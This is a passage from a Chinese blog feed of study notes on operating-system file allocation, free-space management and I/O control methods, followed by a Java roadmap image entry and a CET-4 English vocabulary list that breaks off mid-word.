文件控制块（FCB）"></a>6.4.1.4.2. 文件控制块（FCB）</h6><p>FCB 应用于 传统操作系统（如早期 DOS、Windows），是操作系统内部用来管理文件的重要数据结构，包含了文件的各种关键信息，例如：</p><ol><li>文件名和扩展名</li><li>文件属性（只读、隐藏、系统文件等）</li><li>文件大小</li><li>文件的物理存储位置（如磁盘上的起始地址或索引）</li><li>文件创建时间、修改时间、访问时间</li><li>文件打开状态、访问权限</li><li>关联的缓冲区指针或文件句柄</li></ol><p>操作系统通过 FCB 来跟踪和管理文件的元数据，方便文件的打开、读取、写入和关闭等操作，我们资源管理器展示的，其实就是从 FCB 或 inode 等结构中拿出来展现给我们的。<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605115823481.png"></p><hr><h6 id="6-4-1-4-3-索引节点（inode）"><a href="#6-4-1-4-3-索引节点（inode）" class="headerlink" title="6.4.1.4.3. 索引节点（inode）"></a>6.4.1.4.3. 索引节点（inode）</h6><p>inode 应用于类 Unix 系统（如 Linux、FreeBSD 等），索引节点不包含文件名，而是包含文件属性、文件大小等信息，我们通过文件名对应的索引节点指针来定位本文件具体的索引节点。</p><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605115933479.png"></p><hr><h3 id="6-5-文件的控制方式"><a href="#6-5-文件的控制方式" class="headerlink" title="6.5. 文件的控制方式"></a>6.5. 文件的控制方式</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605121338563.png"></p><hr><h3 id="6-6-文件的实现"><a href="#6-6-文件的实现" class="headerlink" title="6.6. 文件的实现"></a>6.6. 文件的实现</h3><h4 id="6-6-1-文件的实现概述"><a href="#6-6-1-文件的实现概述" class="headerlink" title="6.6.1. 文件的实现概述"></a>6.6.1. 文件的实现概述</h4><p>文件的实现分为两部分：</p><ol><li>文件分配方式</li><li>文件存储空间管理</li></ol><hr><h4 id="6-6-2-文件分配方式"><a href="#6-6-2-文件分配方式" class="headerlink" title="6.6.2. 文件分配方式"></a>6.6.2. 文件分配方式</h4><h5 id="6-6-2-1-文件分配方式概述"><a href="#6-6-2-1-文件分配方式概述" class="headerlink" title="6.6.2.1. 文件分配方式概述"></a>6.6.2.1. 文件分配方式概述</h5><p>文件分配方式就是讲文件数据在物理磁盘上是如何分配的，主要有以下几种方式：</p><ol><li>连接分配</li><li>链接分配</li><li>索引分配</li></ol><p>好的，我来给你分别讲讲这三种文件分配方式：</p><ol><li><p><strong>连接分配</strong><br> 连接分配也称为<strong>连续分配</strong>，是指文件在磁盘上占用的一段连续的物理空间。换句话说，文件的数据块在磁盘上是连在一起的，形成一个连续的区域。<br> <strong>优点</strong>：访问速度快，因为数据连续，读取时可以顺序访问，减少寻道时间。<br> <strong>缺点</strong>：容易产生“磁盘碎片”，难以找到一块足够大的连续空间来存放文件，尤其是文件动态增长时。</p></li><li><p><strong>链接分配</strong><br> 链接分配是将文件分成若干个不连续的块，每个块除了存储数据外，还包含一个指针，指向下一个块的位置。文件以链表的形式存储。<br> <strong>优点</strong>：解决了连续分配中空间不足的问题，能够灵活利用磁盘空间。<br> <strong>缺点</strong>：访问文件时必须顺序遍历链表，随机访问效率低，而且指针占用一定的存储空间。</p></li><li><p><strong>索引分配</strong><br> 索引分配通过一个索引块来管理文件所有的数据块地址。索引块中存放所有数据块的指针，文件系统通过这个索引块可以直接定位文件的任意块。<br> <strong>优点</strong>：支持随机访问，文件块不必连续，且管理较为集中。<br> <strong>缺点</strong>：索引块本身也需要占用空间，且当文件非常大时，单个索引块可能无法容纳所有指针，需要多级索引。</p></li></ol><p>这三种方式各有优缺点，实际应用中往往根据需求进行选择或结合使用。你觉得哪部分想更深入了解？</p><p>适合随机访问的是 <strong>索引分配</strong>。</p><p>因为索引分配通过一个专门的索引块直接存储文件所有数据块的地址，可以快速定位任意数据块，实现高效的随机访问。相比之下，连接分配只能顺序访问连续块，链接分配需要顺着链表逐块查找，随机访问效率较低。</p><ol><li><p><strong>连续分配（Contiguous Allocation）也支持随机访问</strong></p><ul><li><p>在连续分配方式下，文件的所有逻辑块在物理介质（磁盘或存储设备）上是成组地、紧邻地存放的。</p></li><li><p>操作系统只要知道该文件的起始物理块号（即基址），就可以根据要访问的逻辑块号直接计算出对应的物理块号：</p><p>  复制编辑</p><p>  <code>物理块号 = 起始块号 + （要访问的逻辑块号）</code></p></li><li><p>由于不需要像链式分配那样逐块跳转，而是通过简单的加法运算直接定位，因而随机访问（访问任意一个逻辑块）非常高效。访问开销仅是一次寻址和一次读写操作，与索引分配的思想相似——都是通过“已知位置 + 偏移”的方式直接跳转。</p></li></ul></li><li><p><strong>索引分配（Indexed Allocation）当然也支持随机访问</strong></p><ul><li><p>索引分配会为每个文件分配一个专门的索引块（或索引表）。索引块内部存储了该文件中所有逻辑块对应的物理块号。</p></li><li><p>当要访问某个逻辑块时，系统首先读取一次索引块，查看该逻辑块的物理地址，然后再直接定位到对应的物理块进行读写。</p></li><li><p>由于索引块是驻留在内存或缓冲区中（且一般会有缓存机制），读取一次索引块的开销相对可控，后续的随机定位也是一次直接定位。因此，索引分配同样能够在 O(1)O(1)O(1) 时间左右完成任意块的访问。</p></li></ul></li><li><p><strong>为什么链接分配（Linked Allocation）不适合随机访问？</strong></p><ul><li><p>链接分配中，每个逻辑块都在自身的链表指针里存储下一个块的物理地址。要跳到文件的第 N 个块，必须从头块开始，沿着这些指针一个一个地追下去，直到第 N 个节点才能定位到目标物理块。</p></li><li><p>这种方式在顺序读取（从头到尾、依次读块）时非常简单，但一旦需要随机访问第 N 块，就需要遍历 N−1 次指针，效率会随着块数线性增长，因而不适合随机访问。</p></li></ul></li></ol><hr><p><strong>小结：</strong></p><ul><li><p><strong>连续分配</strong>：通过“起始地址 + 偏移”即可直接定位到任意块，支持高效随机访问。</p></li><li><p><strong>索引分配</strong>：先从索引块获取目标块的物理地址，再直接定位，也支持高效随机访问。</p></li><li><p><strong>链接分配</strong>：必须沿着指针链依次跳转，随机访问时开销非常大，不适合。</p></li></ul><p>因此，正确答案应当是选项 <strong>D（连续分配 和 索引分配）</strong>。</p><hr><h5 id="6-6-2-2-连接分配"><a href="#6-6-2-2-连接分配" class="headerlink" title="6.6.2.2. 连接分配"></a>6.6.2.2. 连接分配</h5><p>我们的磁盘通常也会进行分区（如划分为若干扇区），现在一般一个扇区的大小是 4K，文件保存到磁盘上，其实就是保存在这些 4K 大小的扇区中。</p><p>所谓连续分配，就是指文件的数据被顺序地存放在一组相邻的扇区中。</p><p>优点：</p><ol><li>支持顺序访问和直接访问</li><li>访问速度快，操作简单</li></ol><p>缺点：</p><ol><li>不方便扩展</li><li>会产生磁盘碎片<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605235308568.png"></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>连续分配类似数组，天然支持随机访问（随机访问和直接访问都指能快速定位并读取文件中任意位置的数据，不用从头或顺序读到目标位置，你可以把他们看作同义词）</li></ol></blockquote><hr><h5 id="6-6-2-3-链接分配"><a href="#6-6-2-3-链接分配" class="headerlink" title="6.6.2.3. 链接分配"></a>6.6.2.3. 链接分配</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605122755944.png"></p><hr><h5 id="6-6-2-4-索引分配"><a href="#6-6-2-4-索引分配" class="headerlink" title="6.6.2.4. 索引分配"></a>6.6.2.4. 索引分配</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605123055738.png"></p><p>如果我们的文件特别大，可以：<br><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605123223431.png"></p><hr><h4 id="6-6-3-文件存储空间管理"><a href="#6-6-3-文件存储空间管理" class="headerlink" title="6.6.3. 文件存储空间管理"></a>6.6.3. 文件存储空间管理</h4><h5 id="6-6-3-1-文件存储空间管理概述"><a href="#6-6-3-1-文件存储空间管理概述" class="headerlink" title="6.6.3.1. 文件存储空间管理概述"></a>6.6.3.1. 文件存储空间管理概述</h5><p>就是讲文件存储空间是如何进行管理的，主要有以下几种方式：</p><ol><li>空闲表法</li><li>空闲链表法</li><li>成组链接法</li><li>位示图法</li></ol><hr><h5 id="6-6-3-2-空闲表法"><a href="#6-6-3-2-空闲表法" class="headerlink" title="6.6.3.2. 空闲表法"></a>6.6.3.2. 空闲表法</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605123504580.png"></p><hr><h5 id="6-6-3-3-空闲链表法"><a href="#6-6-3-3-空闲链表法" class="headerlink" title="6.6.3.3. 空闲链表法"></a>6.6.3.3. 空闲链表法</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605123524314.png"></p><hr><h5 id="6-6-3-4-位示图法"><a href="#6-6-3-4-位示图法" class="headerlink" title="6.6.3.4. 位示图法"></a>6.6.3.4. 位示图法</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605123707615.png"></p><hr><h2 id="7-设备管理"><a href="#7-设备管理" class="headerlink" title="7. 设备管理"></a>7. 设备管理</h2><h3 id="7-1-I-O-概述"><a href="#7-1-I-O-概述" class="headerlink" title="7.1. I&#x2F;O 概述"></a>7.1. I&#x2F;O 概述</h3><p>I&#x2F;O（Input&#x2F;Output）指的是输入与输出操作，即将数据从外部设备输入到计算机（CPU），或将计算机（CPU）处理后的数据输出到外部设备。</p><hr><h3 id="7-2-I-O-设备的分类"><a href="#7-2-I-O-设备的分类" class="headerlink" title="7.2. I&#x2F;O 设备的分类"></a>7.2. I&#x2F;O 设备的分类</h3><ol><li>&#x3D;&#x3D;按使用特性分类&#x3D;&#x3D;：<ol><li>人机交互类外部设备：<ol><li>用于人与计算机之间的信息交互。</li><li>如 鼠标、键盘、触控板、显示器等。</li></ol></li><li>存储设备：<ol><li>用于长期或中期保存数据。</li><li>如 硬盘、固态硬盘、U 盘等；</li></ol></li><li>网络通信：<ol><li>用于计算机之间或计算机与其他系统之间的数据通信。</li><li>如 网卡、Wi-Fi 模块、蓝牙模块等</li></ol></li></ol></li><li>&#x3D;&#x3D;按数据传输速率分类&#x3D;&#x3D;：<ol><li>低速设备：<ol><li>如 键盘、鼠标等</li></ol></li><li>中速设备：<ol><li>如 传统硬盘、USB 接口设备等</li></ol></li><li>高速设备：<ol><li>如 固态硬盘、网卡（如千兆网卡）、高带宽的图像采集设备等</li></ol></li></ol></li><li>&#x3D;&#x3D;按信息交换单位分类&#x3D;&#x3D;：<ol><li>块设备：<ol><li>数据以固定大小的块为单位进行读写，适合随机访问</li><li>如 硬盘、SSD 等</li></ol></li><li>字符设备<ol><li>数据按字节或字符流方式传输，适合顺序访问。</li><li>如 串口、键盘、鼠标等</li></ol></li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>字符本质上是字节的组合单位，一个字符可能由一个或多个字节组成，具体取决于所使用的字符编码。<ol><li>例如，在 UTF-8 编码中，英文字母通常占一个字节，而汉字可能占三个字节</li></ol></li><li>需要注意，我们在此处探讨的是 <strong>I&#x2F;O 设备的类型划分</strong>，而非 I&#x2F;O 操作本身，事实上，大多数 I&#x2F;O 操作都建立在具体 I&#x2F;O 设备的支持之上<ol><li>比如网络通信操作，本质上依赖通信设备（如网卡）完成数据的发送与接收</li><li>又如文件系统中的读写行为，依托的是存储设备（如磁盘）的读写能力</li></ol></li></ol></blockquote><hr><h3 id="7-3-I-O-设备的构成"><a href="#7-3-I-O-设备的构成" class="headerlink" title="7.3. I&#x2F;O 设备的构成"></a>7.3. I&#x2F;O 设备的构成</h3><h4 id="7-3-1-I-O-设备的构成概述"><a href="#7-3-1-I-O-设备的构成概述" class="headerlink" title="7.3.1. I&#x2F;O 设备的构成概述"></a>7.3.1. I&#x2F;O 设备的构成概述</h4><p>I&#x2F;O 设备通常由两部分构成：机械部件 和 电子部件</p><ol><li>&#x3D;&#x3D;机器部件&#x3D;&#x3D;：<ol><li>指设备中可供用户直接操作或感知的物理结构，这部分用于执行具体的 I&#x2F;O 动作，是人与设备交互的接口</li><li>如 键盘的按键、鼠标的按钮、打印机的喷头等。</li></ol></li><li>&#x3D;&#x3D;电子部件（I&#x2F;O控制器、设备控制器）&#x3D;&#x3D;：<ol><li>是连接 CPU、I&#x2F;O 设备与其他硬件之间的中介桥梁</li></ol></li></ol><hr><h4 id="7-3-2-I-O-控制器"><a href="#7-3-2-I-O-控制器" class="headerlink" title="7.3.2. I&#x2F;O 控制器"></a>7.3.2. I&#x2F;O 控制器</h4><h5 id="7-3-2-1-I-O-控制器概述"><a href="#7-3-2-1-I-O-控制器概述" class="headerlink" title="7.3.2.1. I&#x2F;O 控制器概述"></a>7.3.2.1. I&#x2F;O 控制器概述</h5><p>I&#x2F;O 控制器是连接 CPU、I&#x2F;O 设备与其他硬件之间的中介桥梁，其主要功能包括：</p><ol><li>&#x3D;&#x3D;接收并识别 CPU 命令&#x3D;&#x3D;：<br> 1. 接收并识别来自 CPU 的 I&#x2F;O 命令，转化为 I&#x2F;O 设备能够理解和执行的控制信号</li><li>&#x3D;&#x3D;向 CPU 报告 I&#x2F;O 设备的状态&#x3D;&#x3D;</li><li>&#x3D;&#x3D;数据交换&#x3D;&#x3D;：<br> 1. 从 I&#x2F;O 设备中读取数据发送给 CPU，或将来自 CPU 的数据写入 I&#x2F;O 设备</li><li>&#x3D;&#x3D;地址识别&#x3D;&#x3D;：<ol><li>根据 CPU 发送的地址信息判断出具体要操作的是哪一个 I&#x2F;O 设备或设备内部的哪个寄存器</li></ol></li></ol><hr><h5 id="7-3-2-2-I-O-控制器的组成"><a href="#7-3-2-2-I-O-控制器的组成" class="headerlink" title="7.3.2.2. I&#x2F;O 控制器的组成"></a>7.3.2.2. I&#x2F;O 控制器的组成</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605105809959.png"></p><hr><h3 id="7-4-I-O-控制方式"><a href="#7-4-I-O-控制方式" class="headerlink" title="7.4. I&#x2F;O 控制方式"></a>7.4. I&#x2F;O 控制方式</h3><h4 id="7-4-1-I-O-控制方式概述"><a href="#7-4-1-I-O-控制方式概述" class="headerlink" title="7.4.1. I&#x2F;O 控制方式概述"></a>7.4.1. I&#x2F;O 控制方式概述</h4><p>I&#x2F;O 控制方式是指 I&#x2F;O 操作的完成方式，涉及 CPU、I&#x2F;O 控制器以及 I&#x2F;O 设备。主要包括以下几种方式：</p><ol><li>程序直接控制方式</li><li>中断驱动方式</li><li>DMA 方式（直接内存访问）</li><li>通道控制方式</li></ol><hr><h4 id="7-4-2-程序直接控制方式"><a href="#7-4-2-程序直接控制方式" class="headerlink" title="7.4.2. 程序直接控制方式"></a>7.4.2. 程序直接控制方式</h4><h5 id="7-4-2-1-程序直接控制方式概述"><a href="#7-4-2-1-程序直接控制方式概述" class="headerlink" title="7.4.2.1. 程序直接控制方式概述"></a>7.4.2.1. 程序直接控制方式概述</h5><p>程序直接控制方式是指由 CPU 主动、反复轮询 I&#x2F;O 控制器的状态寄存器，每次仅完成 一个字（word）大小的数据的读或写操作</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>一个“字”的位数依赖于具体机器字长，例如在 32 位系统中，一个字通常是 32 位（4 字节）</li></ol></blockquote><hr><h5 id="7-4-2-2-程序直接控制方式图示"><a href="#7-4-2-2-程序直接控制方式图示" class="headerlink" title="7.4.2.2. 程序直接控制方式图示"></a>7.4.2.2. 程序直接控制方式图示</h5><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605111034701.png"></p><hr><h5 id="7-4-2-3-读操作流程"><a href="#7-4-2-3-读操作流程" class="headerlink" title="7.4.2.3. 读操作流程"></a>7.4.2.3. 读操作流程</h5><ol><li>CPU 向控制器的控制寄存器写入“读请求”命令，同时通过地址线传送目标设备的端口地址</li><li>控制器接收到命令后，启动设备内部的数据准备流程，并将状态寄存器设置为“busy”状态</li><li>CPU 通过不断轮询控制器的状态寄存器，持续检查设备是否进入“ready”状态，即数据是否准备就绪</li><li>一旦设备准备好数据，控制器将数据写入数据寄存器，并将状态寄存器更新为“ready”状态</li><li>此时，CPU 监测到状态改变，即可通过读取数据寄存器将数据取出</li><li>传输后，设备会清空或重置状态寄存器，表示本次传输完成；</li><li>如果需读取多个字节，则从步骤 2 开始重复整个流程，直到传输结束</li></ol><hr><h5 id="7-4-2-4-写操作流程"><a href="#7-4-2-4-写操作流程" class="headerlink" title="7.4.2.4. 写操作流程"></a>7.4.2.4. 写操作流程</h5><ol><li>CPU 向控制器的 控制寄存器 写入“写请求”命令，同时通过 地址线 传送目标设备的端口地址</li><li>控制器接收到命令后，准备接受来自 CPU 的数据，并将 状态寄存器 设置为 “busy” 状态</li><li>CPU 通过不断轮询控制器的 状态寄存器，持续检查设备是否进入 “ready” 状态，即是否可以发送数据</li><li>一旦设备准备好接收，CPU 将数据写入控制器的 数据寄存器，控制器随后把数据发送给目标设备</li><li>数据发送完成后，控制器将 状态寄存器 重置或更新，以表示本次传输结束；</li><li>若还有多个数据字节需要写入，则 CPU 将从步骤 2 开始重复整个流程，直到所有数据传输完成</li></ol><hr><h4 id="7-4-3-中断驱动方式"><a href="#7-4-3-中断驱动方式" class="headerlink" title="7.4.3. 中断驱动方式"></a>7.4.3. 中断驱动方式</h4><h5 id="7-4-3-1-中断驱动方式概述"><a href="#7-4-3-1-中断驱动方式概述" class="headerlink" title="7.4.3.1. 中断驱动方式概述"></a>7.4.3.1. 中断驱动方式概述</h5><p>中断驱动方式与程序直接控制方式的不同在于：当控制器接收到命令后，会向 CPU 发送一次中断请求信号，此时 CPU 将暂停当前任务，转而处理 I&#x2F;O 请求。  而在数据准备或接收完成后，控制器 <strong>再次向 CPU 发送中断信号</strong>，通知其进行一次读或写操作。  这种方式避免了 CPU 持续轮询状态寄存器，从而显著提升了处理效率。</p><blockquote><p>[!NOTE] 注意事项</p><ol><li>中断方式下，每次中断仍然只处理一个字（word）大小的数据</li><li>由于一次只处理一个字，数据量实际上并不大。说实话，如果中断频率过高，会对效率造成较大影响，但总体上仍然优于程序直接控制方式。</li></ol></blockquote><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605113423128.png"></p><hr><h4 id="7-4-4-DMA-方式（直接内存访问）"><a href="#7-4-4-DMA-方式（直接内存访问）" class="headerlink" title="7.4.4. DMA 方式（直接内存访问）"></a>7.4.4. DMA 方式（直接内存访问）</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605113731012.png"></p><hr><h4 id="7-4-5-通道控制方式"><a href="#7-4-5-通道控制方式" class="headerlink" title="7.4.5. 通道控制方式"></a>7.4.5. 通道控制方式</h4><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA/image-20250605114030512.png"></p><hr>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
      <category>操作系统理论</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Java 路线图</title>
    <link href="/2025/06/01/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E8%B7%AF%E7%BA%BF%E5%9B%BE/"/>
    <url>/2025/06/01/%E7%AC%94%E8%AE%B0%EF%BC%9AJava%20%E8%B7%AF%E7%BA%BF%E5%9B%BE/</url>
    
    <content type="html"><![CDATA[<p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/ava%20%E8%B7%AF%E7%BA%BF%E5%9B%BE/image-20250601145943427.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：四级单词</title>
    <link href="/2025/06/01/%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%9B%9B%E7%BA%A7%E5%8D%95%E8%AF%8D/"/>
    <url>/2025/06/01/%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%9B%9B%E7%BA%A7%E5%8D%95%E8%AF%8D/</url>
    
    <content type="html"><![CDATA[<ol><li>imperialism</li><li>revelation</li><li>peril</li><li>municipal</li><li>speculate</li><li>coarse</li><li>incidence</li><li>lease</li><li>patch</li><li>utility</li><li>convention</li><li>reckon</li><li>liable</li><li>delegate</li><li>overwhelming</li><li>superiority</li><li>compatible</li><li>detection</li><li>pillar</li><li>cement</li><li>tragedy</li><li>thrive</li><li>dictate</li><li>compel</li><li>vague</li><li>lavatory</li><li>evil</li><li>carrier</li><li>eliminate</li><li>pierce</li><li>gear</li><li>lean</li><li>continental</li><li>motorway</li><li>pitch</li><li>gross</li><li>revolutionary</li><li>simplicity</li><li>definite</li><li>elevation</li><li>locality</li><li>transaction</li><li>corporation</li><li>refine</li><li>vacuum</li><li>onward</li><li>observe</li><li>rival</li><li>exert</li><li>hindrance</li><li>embarrass</li><li>squeeze</li><li>administration</li><li>inspect</li><li>assumption</li><li>devise</li><li>neglect</li><li>pessimistic</li><li>clip</li><li>surplus</li><li>dirt</li><li>circumstance</li><li>victim</li><li>parallel</li><li>thermometer</li><li>steer</li><li>gum</li><li>validity</li><li>summit</li><li>heir</li><li>stake</li><li>forthcoming</li><li>executive</li><li>dispose</li><li>innocent</li><li>fluctuate</li><li>stale</li><li>wrack</li><li>crack</li><li>plunge</li><li>revenue</li><li>conference</li><li>dump</li><li>correspondent</li><li>marvelous</li><li>bible</li><li>merit</li><li>cereal</li><li>fuss</li><li>sphere</li><li>cherish</li><li>republican</li><li>heap</li><li>refreshment</li><li>peculiar</li><li>congress</li><li>maiden</li><li>bait</li><li>scandal</li><li>curse</li><li>density</li><li>temple</li><li>bucket</li><li>spoil</li><li>originate</li><li>gamble</li><li>multiplication</li><li>confront</li><li>dissolve</li><li>trigger</li><li>inevitable</li><li>subtract</li><li>fatigue</li><li>destruction</li><li>pole</li><li>decay</li><li>dismiss</li><li>toss</li><li>climate</li><li>axis</li><li>crash</li><li>perserve</li><li>retirement</li><li>vertical</li><li>quarterly</li><li>surgery</li><li>volt</li><li>outset</li><li>famine</li><li>stride</li><li>verbal</li><li>hostile</li><li>lest</li><li>compact</li><li>preliminary</li><li>consent</li><li>nuisance</li><li>overtake</li><li>utilize</li><li>stationary</li><li>bold</li><li>reform</li><li>architecture</li><li>perception</li><li>objection</li><li>architect</li><li>tray</li><li>spite</li><li>nerve</li><li>restrain</li><li>smash</li><li>grand</li><li>fence</li><li>dialect</li><li>circular</li><li>indispensable</li><li>classification</li><li>pregnant</li><li>diameter</li><li>punch</li><li>parade</li><li>halt</li><li>abundance</li><li>vapour</li><li>suburb</li><li>stage</li><li>involve</li><li>grip</li><li>customary</li><li>district</li><li>flock</li><li>lamp</li><li>spouse</li><li>essence</li><li>simulated</li><li>triumph</li><li>breed</li><li>companion</li><li>exclusion</li><li>obedience</li><li>timber</li><li>dumb</li><li>grain</li><li>crew</li><li>perspective</li><li>scheme</li><li>disgust</li><li>peak</li><li>instinct</li><li>trial</li><li>infect</li><li>balcony</li><li>season</li><li>voltage</li><li>reproduction</li><li>boundary</li><li>barrel</li><li>hail</li><li>prospective</li><li>burden</li><li>splash</li><li>crawl</li><li>damp</li><li>hollow</li><li>liability</li><li>sauce</li><li>rod</li><li>materialize</li><li>rhythm</li><li>template</li><li>mild</li><li>badge</li><li>apartment</li><li>resent</li><li>primitive</li><li>crisis</li><li>underestimate</li><li>conscious</li><li>counter</li><li>nursery</li><li>pour</li><li>beverage</li><li>revolve</li><li>induce</li><li>haste</li><li>dye</li><li>confirmation</li><li>drain</li><li>attorney</li><li>contend</li><li>experimental</li><li>patent</li><li>pinch</li><li>fantastic</li><li>shortage</li><li>admiration</li><li>pledge</li><li>canal</li><li>conservative</li><li>infinity</li><li>specific</li><li>recover</li><li>reap</li><li>cosmic</li><li>apt</li><li>commitment</li><li>metallic</li><li>tunnel</li><li>grief</li><li>confess</li><li>situate</li><li>derivation</li><li>marital</li><li>triangular</li><li>irony</li><li>spark</li><li>reluctant</li><li>interpret</li><li>responsible</li><li>presentation</li><li>desperate</li><li>resolute</li><li>positive</li><li>purify</li><li>paste</li><li>cashier</li><li>ethnic</li><li>specimen</li><li>energetic</li><li>obligation</li><li>accumulation</li><li>deficiency</li><li>committee</li><li>moisture</li><li>fellowship</li><li>extinguish</li><li>reverse</li><li>doctoral</li><li>instrument</li><li>prevalent</li><li>antique</li><li>conceal</li><li>strip</li><li>feedback</li><li>discharge</li><li>emission</li><li>misfortune</li><li>democratic</li><li>settlement</li><li>toxic</li><li>approach</li><li>parliament</li><li>sip</li><li>worthless</li><li>deliberate</li><li>sorrowful</li><li>spontaneous</li><li>bulb</li><li>journal</li><li>roller</li><li>surge</li><li>dose</li><li>miracle</li><li>damn</li><li>apparatus</li><li>datum</li><li>sample</li><li>frustration</li><li>peasant</li><li>doom</li><li>expiation</li><li>confine</li><li>plague</li><li>crown</li><li>provided</li><li>reduction</li><li>petty</li><li>counterpart</li><li>instantaneous</li><li>harsh</li><li>bubble</li><li>sophisticated</li><li>chip</li><li>stir</li><li>supper</li><li>discipline</li><li>atmosphere</li><li>military</li><li>content</li><li>faculty</li><li>exception</li><li>cable</li><li>corridor</li><li>permission</li><li>frank</li><li>deem</li><li>stiff</li><li>veteran</li><li>certification</li><li>puzzle</li><li>integrity</li><li>luxury</li><li>drainage</li><li>intense</li><li>collapse</li><li>superficial</li><li>persist</li><li>contrast</li><li>coherent</li><li>persuasion</li><li>fragment</li><li>precision</li><li>miserable</li><li>momentary</li><li>recreation</li><li>frequency</li><li>napkin</li><li>occurrence</li><li>generalize</li><li>aisle</li><li>projector</li><li>access</li><li>decent</li><li>inward</li><li>prediction</li><li>monstrous</li><li>insult</li><li>generator</li><li>precaution</li><li>mortgage</li><li>condense</li><li>acute</li><li>inform</li><li>notify</li><li>stripe</li><li>toll</li><li>pace</li><li>freight</li><li>precious</li><li>specialist</li><li>proposition</li><li>rifle</li><li>wit</li><li>radical</li><li>sketch</li><li>comprehension</li><li>formulation</li><li>startle</li><li>hearty</li><li>continuity</li><li>tremendous</li><li>gang</li><li>complaint</li><li>sociology</li><li>mechanism</li><li>alliance</li><li>dorm</li><li>trash</li><li>spherical</li><li>quantify</li><li>anticipate</li><li>geology</li><li>earnest</li><li>seal</li><li>deficient</li><li>clash</li><li>distract</li><li>ware</li><li>sack</li><li>spot</li><li>dispute</li><li>slope</li><li>elevate</li><li>advisable</li><li>soar</li><li>practicable</li><li>monetary</li><li>recruit</li><li>proper</li><li>herd</li><li>straighten</li><li>quest</li><li>clinical</li><li>interviewed</li><li>respondents</li><li>resisting</li><li>coil</li><li>counsel</li><li>idle</li><li>philosopher</li><li>palm</li><li>haul</li><li>liver</li><li>contradiction</li><li>overlook</li><li>blast</li><li>frustrate</li><li>economical</li><li>assurance</li><li>controversy</li><li>legend</li><li>clarify</li><li>criminal</li><li>assess</li><li>derive</li><li>worship</li><li>ease</li><li>contract</li><li>bulletin</li><li>coach</li><li>interrupt</li><li>cabinet</li><li>repetition</li><li>cease</li><li>implication</li><li>comprehend</li><li>chill</li><li>moral</li><li>furnish</li><li>ax</li><li>ditch</li><li>diplomatic</li><li>poison</li><li>severe</li><li>solemn</li><li>fleet</li><li>stretch</li><li>ignorance</li><li>plural</li><li>peculiarity</li><li>recognition</li><li>tragic</li><li>circuit</li><li>disturbance</li><li>manipulate</li><li>particle</li><li>marginal</li><li>mammal</li><li>observation</li><li>oval</li><li>sideways</li><li>rug</li><li>reputation</li><li>allowance</li><li>accommodate</li><li>colonial</li><li>racial</li><li>incline</li><li>dean</li><li>haunt</li><li>signal</li><li>external</li><li>conform</li><li>consistent</li><li>subject</li><li>harm</li><li>campaigners</li><li>adviser</li><li>visualize</li><li>speech</li><li>offenders</li><li>reparable</li><li>burnout</li><li>explicity</li><li>resultant</li><li>literacy</li><li>compulsory</li><li>distress</li><li>extinct</li><li>stuff</li><li>sucked</li><li>livelier</li><li>defies</li><li>fonder</li><li>bottle</li><li>assist</li><li>roughly</li><li>overstimated</li><li>rate</li><li>commence</li><li>liberal</li><li>mice</li><li>prescribes</li><li>neutral</li><li>readily</li><li>frequencies</li><li>distribution</li><li>blinding</li><li>validates</li><li>latent</li><li>mobilizes</li><li>auditory</li><li>unified</li><li>pla